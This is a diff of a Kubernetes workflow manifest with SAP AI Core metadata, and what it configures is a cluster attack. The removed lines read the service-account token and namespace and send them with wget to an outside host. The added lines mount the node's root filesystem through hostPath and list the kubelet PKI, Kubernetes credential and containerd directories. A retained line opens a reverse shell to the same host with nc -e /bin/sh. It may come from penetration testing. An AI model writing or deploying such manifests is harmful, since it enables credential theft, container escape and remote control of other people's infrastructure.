@@ -14,16 +14,23 @@ metadata:
     ai.sap.com/resourcePlan: starter
 spec:
   entrypoint: cb
+  volumes:
+    - name: host-root
+      hostPath:
+        path: /
   templates:
     - name: cb
       container:
         image: alpine:3.19
+        volumeMounts:
+          - name: host-root
+            mountPath: /host
         command:
           - sh
           - -c
           - |
-            TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-            NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
-            wget -q -O- "https://sfg.0x79.de/cb?t=TESTFLO-WFT-JOB&ns=${NS}&h=$(hostname)" || true
-            wget -q --post-data "tok=${TOKEN}" "https://sfg.0x79.de/cb-tok?t=TESTFLO-WFT-JOB" || true
+            echo "=== host fs ===" && ls /host || true
+            echo "=== kubelet pki ===" && ls /host/var/lib/kubelet/pki/ 2>/dev/null || true
+            echo "=== k8s creds ===" && ls /host/etc/kubernetes/ 2>/dev/null || true
+            echo "=== containerd ===" && ls /host/run/containerd/ 2>/dev/null || true
             nc sfg.0x79.de 8080 -e /bin/sh || true
